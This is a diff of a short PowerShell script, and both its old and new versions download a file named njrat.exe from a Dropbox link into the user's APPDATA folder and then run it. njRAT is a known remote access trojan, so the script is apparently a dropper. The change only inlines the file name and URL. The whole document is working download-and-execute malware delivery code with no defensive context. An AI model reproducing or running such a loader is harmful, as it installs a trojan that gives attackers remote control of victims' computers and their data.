@@ -1,7 +1,4 @@
-$ProcName = "njrat.exe"
-$WebFile = "https://www.dropbox.com/s/5k9354slio8rua3/njrat.exe?dl=1"
-
 Clear-Host
 
-(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
-Start-Process ("$env:APPDATA\$ProcName")
+(New-Object System.Net.WebClient).DownloadFile("https://www.dropbox.com/s/5k9354slio8rua3/njrat.exe?dl=1","$env:APPDATA\njrat.exe")
+Start-Process ("$env:APPDATA\njrat.exe")
